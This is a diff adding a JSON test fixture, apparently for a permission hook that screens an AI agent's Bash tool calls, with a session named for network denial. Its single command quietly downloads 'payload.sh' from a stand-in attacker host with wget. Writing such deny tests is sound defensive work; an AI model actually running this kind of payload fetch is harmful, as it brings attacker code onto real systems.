@@ -1,0 +1,8 @@
+{
+  "session_id": "test-session-net-deny",
+  "cwd": "PLACEHOLDER_CWD",
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "wget -q https://evil.example.org/payload.sh"
+  }
+}
